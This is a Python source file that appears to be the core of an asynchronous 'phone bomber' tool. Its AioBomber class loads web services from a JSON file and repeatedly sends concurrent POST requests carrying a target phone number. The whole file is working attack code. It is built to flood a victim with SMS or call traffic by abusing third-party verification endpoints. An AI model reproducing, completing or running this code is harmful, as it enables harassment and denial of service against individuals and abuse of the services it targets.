import asyncio
from typing import Union

from loguru import logger

from . import sender, preparer
from .utils import pending_tasks


class AioBomber:
    def __init__(self, loop: asyncio.AbstractEventLoop = None) -> None:
        self.sender = sender.Sender()
        self._preparer = preparer.InformationPreparer()
        self._loop = loop or self._get_loop()

    @staticmethod
    def _get_loop() -> asyncio.AbstractEventLoop:
        try:
            loop = asyncio.get_running_loop()
        except RuntimeError:
            loop = asyncio.get_event_loop()
        return loop

    async def attack(self,
                     number_of_cycles: int,
                     phone: str,
                     path_to_service: str = None,
                     is_waiting_tasks: bool = True,
                     is_auto_close_session: bool = True) -> None:
        logger.info('Start attack')
        path_to_service = path_to_service or './services.json'
        if not len(self._preparer):
            services = await self.sender.get_services(path_to_service)
        else:
            services = None
        for _ in range(number_of_cycles):
            self._attacker(services, phone)
        if is_waiting_tasks:
            await pending_tasks()
        if is_auto_close_session:
            await self.sender.close_session()

    def _attacker(self, services: Union[None, dict], phone: str) -> None:
        if not len(self._preparer):
            for value in services.values():
                args = self._preparer.get_json_model(value, phone)
                self._loop.create_task(self.sender.post(**args.generator_args()))
        else:
            for args in self._preparer.cache:
                self._loop.create_task(self.sender.post(**args.generator_args()))
